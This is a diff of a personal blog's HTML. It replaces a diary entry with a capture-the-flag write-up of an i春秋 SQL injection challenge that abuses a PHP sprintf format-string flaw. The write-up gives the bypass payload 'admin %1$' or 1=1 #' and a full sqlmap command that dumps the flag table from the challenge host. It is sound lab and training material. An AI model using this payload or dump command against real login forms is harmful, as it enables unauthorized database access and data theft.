@@ -5,22 +5,25 @@
   
 
   
-  <title>日常心路-180909 | Jaylin&#39;s Blog</title>
+  <title>i春秋-WEB-SQLi | Jaylin&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。 突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。 今天，如愿以偿的通过了Syclover的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。 这个学期，需要额外补3门课，把四级">
-<meta name="keywords" content="日常,心路">
+  <meta name="description" content="一道注入题，登录页面。 试了常见的万能密码，无效，不存在弱口令。 使用BP，看下过滤了哪些字符。  发现参数含有%时，报错。  提示 Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18，根据提示，判定可能存在sprintf格式化字符串漏洞。 看下sprintf函数的描述。  可以构造payload:">
+<meta name="keywords" content="i春秋,WEB,SQLi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="日常心路-180909">
-<meta property="og:url" content="http://CHN-Jaylin.github.io/2018/09/09/daily-life-20180909/index.html">
+<meta property="og:title" content="i春秋-WEB-SQLi">
+<meta property="og:url" content="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/index.html">
 <meta property="og:site_name" content="Jaylin&#39;s Blog">
-<meta property="og:description" content="最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。 突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。 今天，如愿以偿的通过了Syclover的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。 这个学期，需要额外补3门课，把四级">
+<meta property="og:description" content="一道注入题，登录页面。 试了常见的万能密码，无效，不存在弱口令。 使用BP，看下过滤了哪些字符。  发现参数含有%时，报错。  提示 Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18，根据提示，判定可能存在sprintf格式化字符串漏洞。 看下sprintf函数的描述。  可以构造payload:">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://chn-jaylin.github.io/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg">
-<meta property="og:updated_time" content="2018-09-09T15:48:57.635Z">
+<meta property="og:image" content="http://chn-jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/bp-1.png">
+<meta property="og:image" content="http://chn-jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/sqli-1.png">
+<meta property="og:image" content="http://chn-jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/info-1.png">
+<meta property="og:image" content="http://chn-jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/sqli-2.png">
+<meta property="og:updated_time" content="2018-09-10T04:11:16.801Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="日常心路-180909">
-<meta name="twitter:description" content="最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。 突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。 今天，如愿以偿的通过了Syclover的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。 这个学期，需要额外补3门课，把四级">
-<meta name="twitter:image" content="http://chn-jaylin.github.io/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg">
+<meta name="twitter:title" content="i春秋-WEB-SQLi">
+<meta name="twitter:description" content="一道注入题，登录页面。 试了常见的万能密码，无效，不存在弱口令。 使用BP，看下过滤了哪些字符。  发现参数含有%时，报错。  提示 Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18，根据提示，判定可能存在sprintf格式化字符串漏洞。 看下sprintf函数的描述。  可以构造payload:">
+<meta name="twitter:image" content="http://chn-jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/bp-1.png">
   
     <link rel="alternate" href="/atom.xml" title="Jaylin&#39;s Blog" type="application/atom+xml">
   
@@ -67,10 +70,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-daily-life-20180909" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-ichunqiu-web-SQLi" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2018/09/09/daily-life-20180909/" class="article-date">
-  <time datetime="2018-09-09T15:14:15.000Z" itemprop="datePublished">2018-09-09</time>
+    <a href="/2018/09/10/ichunqiu-web-SQLi/" class="article-date">
+  <time datetime="2018-09-10T02:23:23.862Z" itemprop="datePublished">2018-09-10</time>
 </a>
     
   </div>
@@ -81,7 +84,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      日常心路-180909
+      i春秋-WEB-SQLi
     </h1>
   
 
@@ -89,20 +92,29 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p>
-<p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p>
-<p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p>
-<p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p>
-<p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p>
-<p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>
+        <p>一道注入题，登录页面。</p>
+<p>试了常见的万能密码，无效，不存在弱口令。</p>
+<p>使用BP，看下过滤了哪些字符。</p>
+<p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p>
+<p>发现参数含有<code>%</code>时，报错。</p>
+<p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p>
+<p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p>
+<p>看下<code>sprintf</code>函数的描述。</p>
+<p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p>
+<p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p>
+<p>此处不回显内容，但是有错误提示，只能盲注。</p>
+<p>可以直接用<code>sqlmap</code>跑出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://CHN-Jaylin.github.io/2018/09/09/daily-life-20180909/" data-id="cjlvrte410002hovn07qlb26n" class="article-share-link">Share</a>
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-SQLi/" data-id="cjlvrte4g0005hovnanc70oz1" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
 
     </footer>
   </div>
@@ -110,19 +122,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2018/09/10/ichunqiu-web-SQLi/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          i春秋-WEB-SQLi
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/08/07/sql-injection-cheat-sheet/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2018/09/09/daily-life-20180909/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">SQL注入备忘录</div>
+      <div class="article-nav-title">日常心路-180909</div>
     </a>
   
 </nav>
